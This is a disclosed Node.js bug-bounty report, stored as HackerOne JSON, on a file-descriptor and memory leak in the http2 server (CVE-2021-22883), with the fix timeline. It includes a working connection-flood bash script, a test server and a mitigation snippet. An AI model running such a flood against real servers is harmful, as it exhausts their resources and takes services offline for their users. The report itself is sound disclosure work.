{"id":1043360,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQzMzYw","url":"https://hackerone.com/reports/1043360","title":"HTTP2 'unknownProtocol' cause Denial of Service by resource exhaustion","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-11-25T11:06:27.749Z","submitted_at":"2020-11-25T11:06:27.818Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"omicronenergy","url":"/omicronenergy","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-22883"],"singular_disclosure_disabled":false,"disclosed_at":"2021-03-15T08:25:43.492Z","bug_reporter_agreed_on_going_public_at":"2021-03-15T08:25:43.412Z","team_member_agreed_on_going_public_at":"2021-02-23T14:45:04.082Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nNode.js http2 server is vulnerable against denial of service attacks when too many connection attempts with an 'unknownProtocol' are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.\n\n**Description:**\nIf an attacker can establish an arbitrary amount of connections to the server and achieves that no session is instantiated by sending data causing the `unknownProtocol` event, then the socket is immediately closed by returning an error message.\n\nIf the attacker closes the socket before this can happen or simply do not respond to the response, the node process starts leaking file descriptors and the memory consumption increases dramatically. Node will wait for the response to the `unknownProtocol` message, which will never come.\n\nTo solve this issue we registered to the `unknownProtocol` event and had to implement two things:\n\n1. Call `socket.end()` without returning data, which seems to solve the problem partially. The amount of leaked file descriptors decreased dramatically but it is still leaking.\n2. Starting a timer and force a `socket.destroy()` after the timeout.\n\nOur current workaround for the problem looks like this:\n\n```\nserver.on('unknownProtocol', socket =\u003e {\n  // Install a timeout of 10 second if the socket was\n  // not successfully closed, then destroy the socket\n  // to ensure that the underlying resources are released.\n  const timer = setTimeout(() =\u003e {\n    if (!socket.destroyed) {\n      socket.destroy();\n    }\n  }, 10000);\n  // Un-reference the timer to avoid blocking\n  // of application shutdown and clear the timeout\n  // if the socket was successfully closed.\n  timer.unref();\n\n  // ATTENTION: Do not use the cb from the end call,\n  // because this also causes leaks!\n  socket.once('close', () =\u003e clearTimeout(timer));\n\n  // Try to gracefully close the socket\n  // ATTENTION: The default implementation provides an error\n  // message to the client, but if the client does not respond\n  // this causes the graceful close to fail. Therefore the\n  // socket is closed here without any message.\n  socket.end();\n});\n```\n\nOnce the node process reached the file descriptor limit of the system it is not possible to establish any new connection to the server. Next the process cannot not do any other operations that require a new file descriptor (e.g. opening a file). If the system has no file descriptor limit, then the process will continue consuming memory until the system has none left.\n\n## Steps To Reproduce:\n\nThe following steps assume you are on a linux system. Everything will run on your host system. The IP in the client is hard-coded to `127.0.0.1` and the port is `50000`. The scripts are kept as simple as possible. \n\n1. Create a file `client.sh` with the content provided in the Supporting Material section below (don't start it now)\n2. Create the Javascript file (see Supporting Material section below) and run the example server (may you want to customize the port). You can also start a non-secure server using `createServer()` if you don't have an example key or cert around.\n3. You query the file descriptors with the command provided in the Supporting Material section below. Simply replace `{PID}` with the process id of your node server.\n4. Maybe you also want to watch the memory consumption with the tool you prefer.\n5. Now you are ready to start the client script.\n\nWe initially found this issue by running the Greenbone Vulnerability Manager on our server port with the **OvenVAS default** scanner, the **Fast and ultimate** configuration with all kind of vulnerability tests enabled and the **TCP-SYN Service Ping** alive check.\n\nThe affected code that causes this issue seems to be [here](https://github.com/nodejs/node/blob/c0ac692ba786f235f9a4938f52eede751a6a73c9/lib/internal/http2/core.js#L2918-L2929).\n\nWe are running on Linux x86 with kernel v4.19.148 with node v12.19.0.\n\n## Impact:\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.\n\n## Supporting Material/References:\n\nclient.sh\n```\n#!/bin/bash\n\nrequest=\"GET / HTTP/1.1 Host: Anything\"\n\nwhile true;\ndo\n    echo $request | openssl s_client -connect 127.0.0.1:50000 \u003e /dev/null 2\u003e\u00261 \u0026\ndone\n```\n\nJavascript File\n```\nconst http2 = require(\"http2\");\nconst fs = require(\"fs\");\n\nconst port = 50000;\n\nprocess.on('uncaughtException', error =\u003e {\n  console.log('An uncaught exception occurred:', error)\n});\n\nprocess.on('unhandledRejection', reason =\u003e {\n  console.log('An unhandled rejection occurred:', reason)\n});\n\nprocess.on('warning', warning =\u003e {\n  console.log('A process warning occurred:', warning)\n});\n\nfunction onRequest(req, res) {\n  console.log('got request')\n}\n\nconst serverOptions = {\n  key: fs.readFileSync(__dirname + \"/key.crt\"),\n  cert: fs.readFileSync(__dirname + \"/cert.crt\")\n};\n\nhttp2\n  .createSecureServer(serverOptions, onRequest)\n  .listen(port, () =\u003e {\n    console.log(\"http2 server started on port\", port);\n  })\n  .on('error', (err) =\u003e console.log(err))\n```\nQuery file descriptors command\n```\nls -l /proc/{PID}/fd | wc -l \u0026\u0026 ls -l /proc/{PID}/map_files | wc -l\n```\n\n\nIf you need anything else let us know.\n\n## Impact\n\nAny code that relies on the http2 server is affected by this behaviour. For example the JavaScript implementation of GRPC also uses a http2 server under the hood.\n\nThis attack has very low complexity and can easily trigger a DOS on an unprotected server.\n\nThe above server example consumes about 6MB memory after start-up. Running the described attack causes a memory consumption of more than 400MB in approximately 30s and holding more than 7000 file descriptors. Both, the file descriptors and the memory, are never freed.","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-03-25T14:45:04.449Z","allow_singular_disclosure_after":-17274838.405240998,"singular_disclosure_allowed":true,"vote_count":3,"voters":["demonia","salahhasoneh","ning1022"],"severity":{"rating":"critical","score":9.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9976661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report. Looks like we can confirm this one @mcollina @mhdawson .. unfortunately I don't have the time immediately available to work on it.","automated_response":false,"created_at":"2020-12-01T16:33:45.842Z","updated_at":"2020-12-01T16:33:45.842Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9976663,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-12-01T16:34:14.596Z","updated_at":"2020-12-01T16:34:14.596Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10134615,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-12-17T16:31:47.196Z","updated_at":"2020-12-17T16:31:47.196Z","actor":{"username":"dlorenc","cleared":false,"url":"/dlorenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10326361,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi - may I ask for an update? Are there any plans?","automated_response":false,"created_at":"2021-01-11T10:49:46.824Z","updated_at":"2021-01-11T10:49:46.824Z","actor":{"username":"omicronenergy","cleared":false,"url":"/omicronenergy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10334730,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@omicronenergy this is a very well written and comprehensive report. We don't yet have a volunteer to help investigate/get changes landed yet so there are no plans/timing that we can report yet.","automated_response":false,"created_at":"2021-01-12T00:14:30.982Z","updated_at":"2021-01-12T00:14:30.982Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10698459,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-02-17T14:40:48.549Z","updated_at":"2021-02-17T14:40:48.549Z","cve_ids":["CVE-2021-22883"],"actor":{"username":"danbev","cleared":false,"url":"/danbev","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37UF4D7L%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131902Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDcM3lUhy%2FyutAdh7f9Zl5mn2Zda9VBqjjsjW3Kqrv9QwIgUJ2GHCBNkuHHHes2KRvisdQVMMh95CwiTU1b1a8oiokqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHKDnseTm0Y%2FhEGv3yrXA%2FXiDUmXXuSyACHOE8HgYRKJ853f1jlwT5AZyK%2Bn5Rt9XrHAopi0fcxoVA3YLQiUzIRWerqTfQlxKYwQmwbXGaNCwOPcuqFnbA0BdiKSoxDZE9%2BAkspI1mhMQLJ5wo08jfzFr75Qd1ChW9WiheW%2FVktOteHAt9aVxqi8Jvt13Vf4hmtjfTIpZbkNbUwjNFSoAAwBiHX%2BPEoNCL2q146kWmH7JQAs46LWWfXpHtaLM0X3j2%2F6OQqcpbbmgNP0iT6G9a5CgaIGBxJLuLkH61YbKPWXwaC8TDE%2FcU3kcKLfZT6PzgvqrUkbtY5Kq12QUSQPRc2p%2F86btY7j%2BbuW2LsLo%2BL8HwPZQqX0Iwg4kPN1oiWkCvCy4C8hJ68%2FJ8V55%2FQGsfNluyoo9N2h%2FImpLRFogGkjCwXw%2FgUm6fVgz6E210lLzFwkpnwSJZD%2FmcaRmUjl0tSuVxctc0XFzksnocu0a7yIDYpb5K7QrxkzD9IKguldIb6P28mU%2Fl%2BNGbXsLagjza5LYY9EpOydfi%2FbJ8psqdp5cmRFbVoWgz8FXZfOtIY%2FL3SbVyc%2FP82wug%2BNvDZV%2F2QhkY%2F5Fq39DFzTJIx0r5IdBfCunO3HvICfVBNCYCOfN%2FEieFXqKzCx75CLBjqlAcuPL4Bcyw7zjajAhspfsc9g22ftBZvRbPtEOifPINRBbT8HbfsijeCJ%2FT7%2BiuoRxWH6OAFtoz80KZDnQALizDt0DzDKgU%2BjEVmWT15an6I5BVjXF4imwZ56XB97AG2TQY%2BkX%2BOj43cXPZZUP6Xqk6lMktc4Sg6T1MBZFmFR8tg4anCMnG6QFQm48IyEtEycWqfvTMqOwqddlUOWnUeoAp%2FGIOm9YQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2906e7813501081a1b7c61cfc002547f0e11291dcf124f62574792794f6e848f"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10755103,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@omicronenergy Thank you for the report!  This has now been included in this [security release](https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/).","automated_response":false,"created_at":"2021-02-23T14:39:35.348Z","updated_at":"2021-02-23T14:39:35.348Z","actor":{"username":"danbev","cleared":false,"url":"/danbev","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37UF4D7L%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131902Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDcM3lUhy%2FyutAdh7f9Zl5mn2Zda9VBqjjsjW3Kqrv9QwIgUJ2GHCBNkuHHHes2KRvisdQVMMh95CwiTU1b1a8oiokqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHKDnseTm0Y%2FhEGv3yrXA%2FXiDUmXXuSyACHOE8HgYRKJ853f1jlwT5AZyK%2Bn5Rt9XrHAopi0fcxoVA3YLQiUzIRWerqTfQlxKYwQmwbXGaNCwOPcuqFnbA0BdiKSoxDZE9%2BAkspI1mhMQLJ5wo08jfzFr75Qd1ChW9WiheW%2FVktOteHAt9aVxqi8Jvt13Vf4hmtjfTIpZbkNbUwjNFSoAAwBiHX%2BPEoNCL2q146kWmH7JQAs46LWWfXpHtaLM0X3j2%2F6OQqcpbbmgNP0iT6G9a5CgaIGBxJLuLkH61YbKPWXwaC8TDE%2FcU3kcKLfZT6PzgvqrUkbtY5Kq12QUSQPRc2p%2F86btY7j%2BbuW2LsLo%2BL8HwPZQqX0Iwg4kPN1oiWkCvCy4C8hJ68%2FJ8V55%2FQGsfNluyoo9N2h%2FImpLRFogGkjCwXw%2FgUm6fVgz6E210lLzFwkpnwSJZD%2FmcaRmUjl0tSuVxctc0XFzksnocu0a7yIDYpb5K7QrxkzD9IKguldIb6P28mU%2Fl%2BNGbXsLagjza5LYY9EpOydfi%2FbJ8psqdp5cmRFbVoWgz8FXZfOtIY%2FL3SbVyc%2FP82wug%2BNvDZV%2F2QhkY%2F5Fq39DFzTJIx0r5IdBfCunO3HvICfVBNCYCOfN%2FEieFXqKzCx75CLBjqlAcuPL4Bcyw7zjajAhspfsc9g22ftBZvRbPtEOifPINRBbT8HbfsijeCJ%2FT7%2BiuoRxWH6OAFtoz80KZDnQALizDt0DzDKgU%2BjEVmWT15an6I5BVjXF4imwZ56XB97AG2TQY%2BkX%2BOj43cXPZZUP6Xqk6lMktc4Sg6T1MBZFmFR8tg4anCMnG6QFQm48IyEtEycWqfvTMqOwqddlUOWnUeoAp%2FGIOm9YQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2906e7813501081a1b7c61cfc002547f0e11291dcf124f62574792794f6e848f"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"omicronenergy","url":"/omicronenergy"},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10755215,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-23T14:45:04.369Z","updated_at":"2021-02-23T14:45:04.369Z","first_to_agree":true,"actor":{"username":"danbev","cleared":false,"url":"/danbev","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37UF4D7L%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131902Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDcM3lUhy%2FyutAdh7f9Zl5mn2Zda9VBqjjsjW3Kqrv9QwIgUJ2GHCBNkuHHHes2KRvisdQVMMh95CwiTU1b1a8oiokqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHKDnseTm0Y%2FhEGv3yrXA%2FXiDUmXXuSyACHOE8HgYRKJ853f1jlwT5AZyK%2Bn5Rt9XrHAopi0fcxoVA3YLQiUzIRWerqTfQlxKYwQmwbXGaNCwOPcuqFnbA0BdiKSoxDZE9%2BAkspI1mhMQLJ5wo08jfzFr75Qd1ChW9WiheW%2FVktOteHAt9aVxqi8Jvt13Vf4hmtjfTIpZbkNbUwjNFSoAAwBiHX%2BPEoNCL2q146kWmH7JQAs46LWWfXpHtaLM0X3j2%2F6OQqcpbbmgNP0iT6G9a5CgaIGBxJLuLkH61YbKPWXwaC8TDE%2FcU3kcKLfZT6PzgvqrUkbtY5Kq12QUSQPRc2p%2F86btY7j%2BbuW2LsLo%2BL8HwPZQqX0Iwg4kPN1oiWkCvCy4C8hJ68%2FJ8V55%2FQGsfNluyoo9N2h%2FImpLRFogGkjCwXw%2FgUm6fVgz6E210lLzFwkpnwSJZD%2FmcaRmUjl0tSuVxctc0XFzksnocu0a7yIDYpb5K7QrxkzD9IKguldIb6P28mU%2Fl%2BNGbXsLagjza5LYY9EpOydfi%2FbJ8psqdp5cmRFbVoWgz8FXZfOtIY%2FL3SbVyc%2FP82wug%2BNvDZV%2F2QhkY%2F5Fq39DFzTJIx0r5IdBfCunO3HvICfVBNCYCOfN%2FEieFXqKzCx75CLBjqlAcuPL4Bcyw7zjajAhspfsc9g22ftBZvRbPtEOifPINRBbT8HbfsijeCJ%2FT7%2BiuoRxWH6OAFtoz80KZDnQALizDt0DzDKgU%2BjEVmWT15an6I5BVjXF4imwZ56XB97AG2TQY%2BkX%2BOj43cXPZZUP6Xqk6lMktc4Sg6T1MBZFmFR8tg4anCMnG6QFQm48IyEtEycWqfvTMqOwqddlUOWnUeoAp%2FGIOm9YQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2906e7813501081a1b7c61cfc002547f0e11291dcf124f62574792794f6e848f"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10781013,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-02-25T07:05:18.067Z","updated_at":"2021-02-25T07:05:18.067Z","actor":{"url":"/nodejs","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Node.js"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nodejs","collaborator":{"username":"omicronenergy","url":"/omicronenergy"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10992638,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-03-15T08:25:43.442Z","updated_at":"2021-03-15T08:25:43.442Z","actor":{"username":"omicronenergy","cleared":false,"url":"/omicronenergy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10992639,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-03-15T08:25:43.555Z","updated_at":"2021-03-15T08:25:43.555Z","actor":{"username":"omicronenergy","cleared":false,"url":"/omicronenergy","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}